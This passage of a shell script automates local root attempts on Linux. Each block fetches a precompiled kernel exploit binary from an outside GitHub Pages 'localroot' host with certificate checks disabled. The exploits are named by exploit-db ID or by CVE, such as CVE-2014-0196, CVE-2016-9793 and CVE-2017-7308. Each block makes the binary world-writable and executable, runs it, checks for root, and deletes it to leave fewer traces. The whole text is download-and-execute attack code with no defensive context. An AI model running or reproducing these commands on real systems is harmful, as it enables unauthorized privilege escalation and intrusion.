...
wget -q "https://mrwawanj.github.io/localroot/37292.bin" --no-check-certificate
chmod 777 37292.bin
./37292.bin
check_root
rm -f 37292.bin

wget -q "https://mrwawanj.github.io/localroot/33824.bin" --no-check-certificate
chmod 777 33824.bin
./33824.bin
check_root
rm -f 33824.bin

wget -q "https://mrwawanj.github.io/localroot/34134.bin" --no-check-certificate
chmod 777 34134.bin
./34134.bin
check_root
rm -f 34134.bin

wget -q "https://mrwawanj.github.io/localroot/35370.bin" --no-check-certificate
chmod 777 35370.bin
./35370.bin
check_root
rm -f 35370.bin

wget -q "https://mrwawanj.github.io/localroot/39166.bin" --no-check-certificate
chmod 777 39166.bin
./39166.bin
check_root
rm -f 39166.bin

wget -q "https://mrwawanj.github.io/localroot/cve-2014-0196-md.bin" --no-check-certificate
chmod 777 cve-2014-0196-md.bin
./cve-2014-0196-md.bin
check_root
rm -f cve-2014-0196-md.bin

wget -q "https://mrwawanj.github.io/localroot/CVE-2016-9793.bin" --no-check-certificate
chmod 777 CVE-2016-9793.bin
./CVE-2016-9793.bin
check_root
rm -f CVE-2016-9793.bin

wget -q "https://mrwawanj.github.io/localroot/CVE-2017-7308.bin" --no-check-certificate
chmod 777 CVE-2017-7308.bin
./CVE-2017-7308.bin
check_root
rm -f CVE-2017-7308.bin
